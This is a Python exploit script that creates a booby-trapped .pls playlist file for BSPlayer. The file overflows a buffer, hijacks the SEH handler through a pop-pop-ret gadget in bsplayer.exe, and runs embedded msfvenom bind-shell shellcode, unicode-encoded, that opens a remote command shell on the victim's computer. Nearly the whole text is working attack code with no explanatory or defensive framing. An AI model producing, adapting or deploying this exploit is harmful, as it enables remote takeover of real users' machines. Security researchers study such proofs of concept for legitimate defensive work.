#!/usr/bin/python

import struct

file = "lagu-random5.pls"
buf = "\x68\x74\x74\x70\x3a\x2f\x2f"	# http:// 
buf += "\x41" * 4102
nseh = "\x61\x62"	# popad 
seh = "\x25\x4f"	# 0x004f0025 # pop ecx # pop ebp # ret from bsplayer.exe

prepare = "B"
prepare += "\x6e"	# nop/align
prepare += "\x55"	# push ebp
prepare += "\x6e"	# nop/align
prepare += "\x58"	# pop eax
prepare += "\x6e"	# nop/align
prepare += "\x05\x14\x11"	# add eax, 0x11001400
prepare += "\x6e"	# nop/align
prepare += "\x2d\x13\x11"	# sub eax, 0x11001300
prepare += "\x6e"	# nop/align

jump = "\x50"		# push eax
jump += "\x6e"		# nop/align
jump += "\xc3"		# ret

padding = "C" * 107	# will make sure shellcode to eax

# ./msfvenom -p windows/shell_bind_tcp -e x86/unicode_mixed BufferRegister=EAX -f c
# Attempting to encode payload with 1 iterations of x86/unicode_mixed
# x86/unicode_mixed succeeded with size 782 (iteration=0)
shellcode = ("\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
"\x49\x41\x6a\x58\x41\x51\x41\x44\x41\x5a\x41\x42\x41\x52\x41"
"\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49"
"\x41\x49\x41\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49"
"\x41\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41\x5a"
"\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
"\x75\x34\x4a\x42\x69\x6c\x79\x58\x35\x32\x49\x70\x59\x70\x59"
"\x70\x71\x50\x61\x79\x67\x75\x50\x31\x45\x70\x4f\x74\x42\x6b"
"\x70\x50\x6e\x50\x32\x6b\x4e\x72\x7a\x6c\x34\x4b\x42\x32\x6e"
"\x34\x64\x4b\x43\x42\x4c\x68\x6a\x6f\x67\x47\x6d\x7a\x4d\x56"
"\x6e\x51\x49\x6f\x64\x6c\x6f\x4c\x33\x31\x53\x4c\x4d\x32\x6c"
"\x6c\x6b\x70\x77\x51\x48\x4f\x6a\x6d\x5a\x61\x66\x67\x7a\x42"
"\x6c\x32\x30\x52\x61\x47\x64\x4b\x32\x32\x4a\x70\x54\x4b\x4e"
"\x6a\x4d\x6c\x52\x6b\x4e\x6c\x6c\x51\x61\x68\x67\x73\x6d\x78"
"\x4b\x51\x58\x51\x50\x51\x34\x4b\x61\x49\x6b\x70\x5a\x61\x56"
"\x73\x64\x4b\x61\x39\x4d\x48\x49\x53\x4d\x6a\x6d\x79\x44\x4b"
"\x30\x34\x44\x4b\x69\x71\x66\x76\x6c\x71\x59\x6f\x74\x6c\x47"
"\x51\x46\x6f\x4a\x6d\x39\x71\x48\x47\x50\x38\x69\x50\x63\x45"
"\x59\x66\x39\x73\x31\x6d\x6c\x38\x6f\x4b\x33\x4d\x6b\x74\x70"
"\x75\x6b\x34\x4e\x78\x34\x4b\x71\x48\x6e\x44\x79\x71\x49\x43"
"\x70\x66\x44\x4b\x7a\x6c\x4e\x6b\x42\x6b\x31\x48\x6d\x4c\x4b"
"\x51\x78\x53\x74\x4b\x4b\x54\x64\x4b\x4a\x61\x5a\x30\x45\x39"
"\x71\x34\x6d\x54\x6d\x54\x51\x4b\x71\x4b\x53\x31\x62\x39\x4e"
"\x7a\x70\x51\x79\x6f\x37\x70\x51\x4f\x51\x4f\x6f\x6a\x74\x4b"
"\x4e\x32\x6a\x4b\x62\x6d\x31\x4d\x70\x68\x6d\x63\x4c\x72\x4d"
"\x30\x6b\x50\x73\x38\x42\x57\x54\x33\x30\x32\x61\x4f\x6e\x74"
"\x4f\x78\x50\x4c\x30\x77\x6f\x36\x69\x77\x49\x6f\x59\x45\x57"
"\x48\x62\x70\x79\x71\x4d\x30\x39\x70\x6e\x49\x35\x74\x50\x54"
"\x42\x30\x6f\x78\x6f\x39\x75\x30\x50\x6b\x49\x70\x69\x6f\x48"
"\x55\x70\x6a\x6b\x58\x51\x49\x50\x50\x68\x62\x59\x6d\x6d\x70"
"\x30\x50\x6d\x70\x72\x30\x6f\x78\x57\x7a\x5a\x6f\x39\x4f\x59"
"\x50\x6b\x4f\x57\x65\x65\x47\x70\x68\x69\x72\x4b\x50\x6e\x31"
"\x51\x4c\x61\x79\x78\x66\x61\x5a\x4e\x30\x6e\x76\x31\x47\x71"
"\x58\x38\x42\x37\x6b\x4d\x67\x71\x57\x4b\x4f\x46\x75\x32\x37"
"\x43\x38\x76\x57\x47\x79\x4e\x58\x49\x6f\x79\x6f\x56\x75\x4f"
"\x67\x62\x48\x51\x64\x7a\x4c\x4f\x4b\x6b\x31\x6b\x4f\x48\x55"
"\x70\x57\x64\x57\x52\x48\x33\x45\x50\x6e\x6e\x6d\x43\x31\x49"
"\x6f\x76\x75\x61\x58\x63\x33\x42\x4d\x71\x54\x49\x70\x61\x79"
"\x48\x63\x4e\x77\x32\x37\x4e\x77\x4e\x51\x39\x66\x51\x5a\x7a"
"\x72\x6f\x69\x30\x56\x39\x52\x69\x6d\x71\x56\x38\x47\x4f\x54"
"\x4c\x64\x4f\x4c\x6d\x31\x6a\x61\x64\x4d\x4e\x64\x6b\x74\x6e"
"\x30\x79\x36\x49\x70\x70\x44\x6f\x64\x4e\x70\x6f\x66\x4e\x76"
"\x31\x46\x6d\x76\x42\x36\x4e\x6e\x51\x46\x42\x36\x52\x33\x42"
"\x36\x73\x38\x64\x39\x56\x6c\x4d\x6f\x55\x36\x39\x6f\x36\x75"
"\x31\x79\x39\x50\x6e\x6e\x6f\x66\x4f\x56\x59\x6f\x50\x30\x72"
"\x48\x69\x78\x34\x47\x4d\x4d\x61\x50\x39\x6f\x76\x75\x47\x4b"
"\x4c\x30\x58\x35\x36\x42\x61\x46\x43\x38\x76\x46\x36\x35\x45"
"\x6d\x35\x4d\x69\x6f\x5a\x35\x4d\x6c\x6d\x36\x33\x4c\x5a\x6a"
"\x75\x30\x6b\x4b\x6b\x30\x50\x75\x7a\x65\x75\x6b\x6d\x77\x5a"
"\x73\x44\x32\x32\x4f\x70\x6a\x49\x70\x70\x53\x39\x6f\x67\x65"
"\x41\x41")

junk = "B" * (5000 - len(buf+nseh+seh+prepare+jump+padding+shellcode))

sploit = buf+nseh+seh+prepare+jump+padding+shellcode+junk
f = open(file, 'w')
f.write(sploit)
f.close()